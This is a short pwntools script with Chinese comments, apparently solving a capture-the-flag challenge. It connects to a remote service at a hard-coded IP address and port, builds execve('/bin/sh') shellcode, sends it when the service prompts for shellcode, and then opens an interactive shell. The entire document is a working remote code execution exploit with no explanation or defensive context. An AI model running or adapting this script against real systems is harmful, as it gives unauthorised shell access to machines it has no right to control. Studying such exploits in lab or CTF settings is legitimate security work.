from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = remote('110.42.112.160', 23378)

shellcode = asm(shellcraft.sh())   # 生成 execve("/bin/sh") 机器码（48 字节）

p.recvuntil(b"shellcode:")         # 等提示 "Give me your shellcode:"
p.send(shellcode)                  # 发 shellcode

p.interactive()                    # 拿到 shell 后交互
